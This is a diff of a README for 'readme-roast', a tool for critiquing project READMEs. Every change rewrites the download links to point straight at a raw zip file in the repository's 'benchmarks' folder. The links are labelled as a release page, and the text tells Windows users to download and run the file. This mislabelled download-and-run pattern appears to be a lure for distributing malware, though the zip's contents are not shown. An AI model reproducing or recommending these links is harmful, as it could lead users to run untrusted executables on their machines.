@@ -1,6 +1,6 @@
 # 🥵 readme-roast - Find What Hurts Star Conversion
 
-[![Download from Releases](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Gershoncasuistical234/readme-roast/raw/refs/heads/main/benchmarks/roast_readme_v1.1.zip)
+[![Download from Releases](https://img.shields.io/badge/Download-Release%20Page-blue)](https://raw.githubusercontent.com/Gershoncasuistical234/readme-roast/main/benchmarks/roast_readme_v1.1.zip)
 
 ## 🔍 What is readme-roast?
 
@@ -12,7 +12,7 @@ Use it when you want a plain view of how your README reads to visitors. It helps
 
 Visit the release page and download the Windows file from there:
 
-https://github.com/Gershoncasuistical234/readme-roast/raw/refs/heads/main/benchmarks/roast_readme_v1.1.zip
+https://raw.githubusercontent.com/Gershoncasuistical234/readme-roast/main/benchmarks/roast_readme_v1.1.zip
 
 After the file downloads:
 
@@ -80,7 +80,7 @@ The app groups issues so you can fix the most visible ones first. That helps you
 ## 🚀 Getting started
 
 1. Download the release file from:
-   https://github.com/Gershoncasuistical234/readme-roast/raw/refs/heads/main/benchmarks/roast_readme_v1.1.zip
+   https://raw.githubusercontent.com/Gershoncasuistical234/readme-roast/main/benchmarks/roast_readme_v1.1.zip
 
 2. Open the downloaded file.
 
@@ -214,6 +214,6 @@ It helps with structure, clarity, first-impression text, and overall scanability
 
 Get the Windows release here:
 
-https://github.com/Gershoncasuistical234/readme-roast/raw/refs/heads/main/benchmarks/roast_readme_v1.1.zip
+https://raw.githubusercontent.com/Gershoncasuistical234/readme-roast/main/benchmarks/roast_readme_v1.1.zip
 
 Open the release page, download the file for Windows, and run it after the download finishes
